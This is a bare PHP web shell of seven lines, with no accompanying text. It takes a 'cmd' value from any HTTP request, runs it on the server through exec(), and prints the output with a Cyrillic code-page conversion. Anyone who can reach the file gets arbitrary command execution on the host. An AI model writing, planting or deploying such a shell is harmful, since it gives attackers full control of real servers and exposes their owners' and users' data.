<?php
$cmd = $_REQUEST['cmd'];
if ($cmd) {
 exec($cmd, $out);
 echo convert_cyr_string(implode("\r\n", $out), "a", "w");
}
?>